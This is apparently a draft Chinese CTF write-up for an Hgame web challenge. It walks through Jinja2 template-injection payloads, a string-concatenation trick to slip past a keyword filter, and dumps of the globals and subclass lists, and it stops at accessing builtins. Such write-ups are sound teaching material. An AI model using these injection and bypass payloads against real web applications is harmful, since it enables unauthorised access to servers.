---
date: '2025-08-19T12:55:10+08:00'
draft: true
title: '2025 Hgame Mini Web 题解'
tags: ['ctf']
comments: true
---

## 琪露诺计算器(200pt)

提交payload `{{ 7*7 }}`。服务器返回了 49，而不是 `{{ 7*7 }}` 字符串。这证实了模板引擎正在执行我们的输入，确认为SSTI漏洞。根据 {{}} 语法，可以初步判断为Flask/Jinja2或PHP/Twig环境。

```txt
{{ g }}

我知道了! 答案是 <flask.g of 'app'> !哼哼, 不愧是我~
```

确认是 flask。

```txt
{{ ''.__class__.__mro__[1].__subclasses__() }}

竟敢小看最强的我, 我要把你冻起来!

subclasses

竟敢小看最强的我, 我要把你冻起来!

class

我知道了! 答案是 class !哼哼, 不愧是我~

mro

我知道了! 答案是 mro !哼哼, 不愧是我~

{{ 'sub' + 'classes' }}

我知道了! 答案是 subclasses !哼哼, 不愧是我~

```

单引号没被 WAF，可以用字符串拼接

```txt
{{ self.__init__.__globals__ }}

我知道了! 答案是 {'__name__': 'jinja2.runtime', '__doc__': 'The runtime functions and state used by compiled templates.', '__package__': 'jinja2', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f35bfcc9460>, '__spec__': ModuleSpec(name='jinja2.runtime', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f35bfcc9460>, origin='/usr/local/lib/python3.12/site-packages/jinja2/runtime.py'), '__file__': '/usr/local/lib/python3.12/site-packages/jinja2/runtime.py', '__cached__': '/usr/local/lib/python3.12/site-packages/jinja2/__pycache__/runtime.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python; for example, builtins.len is\nthe full name for the built-in function len().\n\nThis module is not normally accessed explicitly by most\napplications, but can be useful in modules that provide\nobjects with the same name as a built-in value, but in\nwhich the built-in of that name is also needed.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'BaseExceptionGroup': <class 'BaseExceptionGroup'>, 'Exception': <class 'Exception'>, 'GeneratorExit': <class 'GeneratorExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'SystemExit': <class 'SystemExit'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BufferError': <class 'BufferError'>, 'EOFError': <class 'EOFError'>, 'ImportError': <class 'ImportError'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'OSError': <class 'OSError'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SystemError': <class 'SystemError'>, 'TypeError': <class 'TypeError'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'BlockingIOError': <class 'BlockingIOError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionError': <class 'ConnectionError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'InterruptedError': <class 'InterruptedError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'RecursionError': <class 'RecursionError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeError': <class 'UnicodeError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'TabError': <class 'TabError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'ExceptionGroup': <class 'ExceptionGroup'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2023 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen, Zope Corporation, the Python Software Foundation, and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'functools': <module 'functools' from '/usr/local/lib/python3.12/functools.py'>, 'sys': <module 'sys' (built-in)>, 't': <module 'typing' from '/usr/local/lib/python3.12/typing.py'>, 'abc': <module 'collections.abc' from '/usr/local/lib/python3.12/collections/abc.py'>, 'chain': <class 'itertools.chain'>, 'escape': <function escape at 0x7f35c034fa60>, 'Markup': <class 'markupsafe.Markup'>, 'soft_str': <function soft_str at 0x7f35c034fce0>, 'auto_aiter': <function auto_aiter at 0x7f35bfcb2d40>, 'auto_await': <function auto_await at 0x7f35bfcb2b60>, 'TemplateNotFound': <class 'jinja2.exceptions.TemplateNotFound'>, 'TemplateRuntimeError': <class 'jinja2.exceptions.TemplateRuntimeError'>, 'UndefinedError': <class 'jinja2.exceptions.UndefinedError'>, 'EvalContext': <class 'jinja2.nodes.EvalContext'>, '_PassArg': <enum '_PassArg'>, 'concat': <built-in method join of str object at 0x7f35c1c2b5b0>, 'internalcode': <function internalcode at 0x7f35bfc32020>, 'missing': missing, 'Namespace': <class 'jinja2.utils.Namespace'>, 'object_type_repr': <function object_type_repr at 0x7f35bfc32520>, 'pass_eval_context': <function pass_eval_context at 0x7f35bfc31ee0>, 'V': ~V, 'F': ~F, 'exported': ['LoopContext', 'TemplateReference', 'Macro', 'Markup', 'TemplateRuntimeError', 'missing', 'escape', 'markup_join', 'str_join', 'identity', 'TemplateNotFound', 'Namespace', 'Undefined', 'internalcode'], 'async_exported': ['AsyncLoopContext', 'auto_aiter', 'auto_await'], 'identity': <function identity at 0x7f35bfcb32e0>, 'markup_join': <function markup_join at 0x7f35bfcb3740>, 'str_join': <function str_join at 0x7f35bfcb37e0>, 'new_context': <function new_context at 0x7f35bfcb39c0>, 'TemplateReference': <class 'jinja2.runtime.TemplateReference'>, '_dict_method_all': <function _dict_method_all at 0x7f35bfcb3b00>, 'Context': <class 'jinja2.runtime.Context'>, 'BlockReference': <class 'jinja2.runtime.BlockReference'>, 'LoopContext': <class 'jinja2.runtime.LoopContext'>, 'AsyncLoopContext': <class 'jinja2.runtime.AsyncLoopContext'>, 'Macro': <class 'jinja2.runtime.Macro'>, 'Undefined': <class 'jinja2.runtime.Undefined'>, 'make_logging_undefined': <function make_logging_undefined at 0x7f35bfcb3ce0>, 'ChainableUndefined': <class 'jinja2.runtime.ChainableUndefined'>, 'DebugUndefined': <class 'jinja2.runtime.DebugUndefined'>, 'StrictUndefined': <class 'jinja2.runtime.StrictUndefined'>} !哼哼, 不愧是我~

{{ ''.__class__.__mro__[1]['__sub' + 'classes__']() }}
我知道了! 答案是 [<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'sys.legacy_event_handler'>, <class 'InterpreterID'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'genericpath.ALLOW_MISSING'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '__future__._Feature'>, <class 'itertools.accumulate'>, <class 'itertools.batched'>, <class 'itertools.chain'>, <class 'itertools.combinations'>, <class 'itertools.compress'>, <class 'itertools.count'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools.islice'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.starmap'>, <class 'itertools.takewhile'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'itertools.zip_longest'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class 'collections._deque_iterator'>, <class 'collections._deque_reverse_iterator'>, <class 'collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._not_given'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class '_sre.SRE_Template'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'typing._Final'>, <class 'typing._NotIterable'>, typing.Any, <class 'typing._PickleUsingNameMixin'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class '_random.Random'>, <class '_sha2.SHA224Type'>, <class '_sha2.SHA256Type'>, <class '_sha2.SHA384Type'>, <class '_sha2.SHA512Type'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseConstants'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class 'mimetypes.MimeTypes'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class 'zlib._ZlibDecompressor'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class '_tokenize.TokenizerIter'>, <class 'tokenize.Untokenizer'>, <class 'textwrap.TextWrapper'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.datastructures.mixins.ImmutableListMixin'>, <class 'werkzeug.datastructures.mixins.ImmutableHeadersMixin'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.TemporaryDirectory'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'ast.AST'>, <class 'werkzeug.datastructures.auth.Authorization'>, <class 'werkzeug.datastructures.auth.WWWAuthenticate'>, <class 'ast.NodeVisitor'>, <class 'dis._Unknown'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'werkzeug.datastructures.headers.Headers'>, <class 'werkzeug.datastructures.file_storage.FileStorage'>, <class 'werkzeug.datastructures.range.IfRange'>, <class 'werkzeug.datastructures.range.Range'>, <class 'werkzeug.datastructures.range.ContentRange'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._KW_ONLY_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'werkzeug.sansio.multipart.Event'>, <class 'werkzeug.sansio.multipart.MultipartDecoder'>, <class 'werkzeug.sansio.multipart.MultipartEncoder'>, <class 'importlib._abc.Loader'>, <class 'importlib.util._incompatible_extension_module_restrictions'>, <class 'unicodedata.UCD'>, <class 'hmac.HMAC'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.user_agent.UserAgent'>, <class 'werkzeug.sansio.request.Request'>, <class 'werkzeug.sansio.response.Response'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'werkzeug.test.Cookie'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local._ProxyLookup'>, <class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'platform._Processor'>, <class 'uuid.UUID'>, <class 'flask.json.provider.JSONProvider'>, <class 'gettext.NullTranslations'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser._Option'>, <class 'click.parser._Argument'>, <class 'click.parser._ParsingState'>, <class 'click.parser._OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.Command'>, <class 'click.core.Parameter'>, <class 'werkzeug.routing.converters.BaseConverter'>, <class 'difflib.SequenceMatcher'>, <class 'difflib.Differ'>, <class 'difflib.HtmlDiff'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'werkzeug.routing.rules.RulePart'>, <class 'werkzeug.routing.rules.RuleFactory'>, <class 'werkzeug.routing.rules.RuleTemplate'>, <class 'werkzeug.routing.matcher.State'>, <class 'werkzeug.routing.matcher.StateMachineMatcher'>, <class 'werkzeug.routing.map.Map'>, <class 'werkzeug.routing.map.MapAdapter'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile._path.InitializedState'>, <class 'zipfile._path.Path'>, <class 'importlib.resources.abc.ResourceReader'>, <class 'importlib.resources._adapters.SpecLoaderAdapter'>, <class 'importlib.resources._adapters.TraversableResourcesLoader'>, <class 'importlib.resources._adapters.CompatibilityFiles'>, <class 'importlib.abc.MetaPathFinder'>, <class 'importlib.abc.PathEntryFinder'>, <class 'importlib.metadata.Sectioned'>, <class 'importlib.metadata.DeprecatedTuple'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.DeprecatedNonAbstract'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Lookup'>, <class 'importlib.metadata.Prepared'>, <class 'blinker._utilities.Symbol'>, <class 'blinker.base.Signal'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.utils._MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContext'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'flask.sansio.scaffold.Scaffold'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous._json._CompactJSON'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.sansio.blueprints.BlueprintSetupState'>, <class 'flask_cors.extension.CORS'>, <class 'multiprocessing.process.BaseProcess'>, <class 'multiprocessing.reduction._C'>, <class 'multiprocessing.reduction.AbstractReducer'>, <class 'multiprocessing.context.BaseContext'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'werkzeug.debug.repr._Helper'>, <class 'werkzeug.debug.repr.DebugReprGenerator'>, <class 'werkzeug.debug.console.HTMLStringO'>, <class 'werkzeug.debug.console.ThreadedStream'>, <class 'werkzeug.debug.console._ConsoleLoader'>, <class 'werkzeug.debug.console.Console'>, <class 'werkzeug.debug.tbtools.DebugTraceback'>, <class 'werkzeug.debug._ConsoleFrame'>, <class 'werkzeug.debug.DebuggedApplication'>, <class '_ctypes.CArgObject'>, <class '_ctypes.CThunkObject'>, <class '_ctypes._CData'>, <class '_ctypes.CField'>, <class '_ctypes.DictRemover'>, <class '_ctypes.StructParam_Type'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'ctypes._endian._swapped_meta'>, <class 'mmap.mmap'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'multiprocessing.util.Finalize'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.heap.Arena'>, <class 'multiprocessing.heap.Heap'>, <class 'multiprocessing.heap.BufferWrapper'>, <class 'multiprocessing.sharedctypes.SynchronizedBase'>, <class '_multiprocessing.SemLock'>, <class 'multiprocessing.synchronize.SemLock'>, <class 'multiprocessing.synchronize.Condition'>, <class 'multiprocessing.synchronize.Event'>, <class 'werkzeug._reloader.ReloaderLoop'>] !哼哼, 不愧是我~

```

globals 中有 builtins, 从这入手。

```txt
{{ self.__init__.__globals__.__builtins__ }}
琪露诺
